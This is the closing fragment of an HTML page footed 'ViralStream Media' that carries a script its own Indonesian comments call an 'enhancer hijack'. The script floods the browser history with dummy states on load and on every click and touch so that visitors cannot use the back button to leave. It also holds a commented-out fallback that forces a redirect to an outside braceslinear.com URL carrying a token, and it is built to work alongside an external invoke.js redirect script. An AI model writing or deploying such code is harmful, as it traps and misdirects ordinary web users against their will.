  <footer>Â© 2025 ViralStream Media. All rights reserved.</footer>

  <!-- ENHANCER HIJACK: Tambah kekuatan pushState tanpa override redirect invoke.js -->
  <script>
    (function() {
      // Tunggu invoke.js load dulu (kurang lebih 1-2 detik)
      window.addEventListener('load', function() {
        setTimeout(enhanceHijack, 1500); // delay biar invoke.js set handler dulu
      });

      function enhanceHijack() {
        if (!window.history?.pushState) return;

        // Push extra dummy states (3-5x biar back lebih susah keluar)
        for (let i = 0; i < 4; i++) {
          history.pushState({enhance: true, dummy: i}, '', location.href);
        }

        // Kalau invoke.js sudah set onpopstate, jangan override â€” cukup tambah push
        // Tapi kalau mau force redirect ke braceslinear pattern (fallback), uncomment:
        /*
        const originalOnPop = window.onpopstate;
        window.onpopstate = function(e) {
          // Trigger redirect mirip invoke.js (ke /api/users?token=... via simulate)
          if (originalOnPop) originalOnPop(e);
          // Atau force ke braceslinear base (token auto dari server)
          location.replace('https://braceslinear.com/api/users?token=dynamic_from_invoke');
        };
        */

        // Extra: push state setiap interact (mobile-friendly)
        document.addEventListener('touchstart', () => {
          history.pushState(null, null, location.href);
        }, {once: false}); // once:false biar setiap touch push lagi

        document.addEventListener('click', () => {
          history.pushState(null, null, location.href);
        }, {once: false});
      }

      // Optional: push ringan setiap 800ms kalau user idle lama (uncomment kalau mau agresif)
      // setInterval(() => history.pushState(null, null, location.href), 800);
    })();
  </script>

</body>
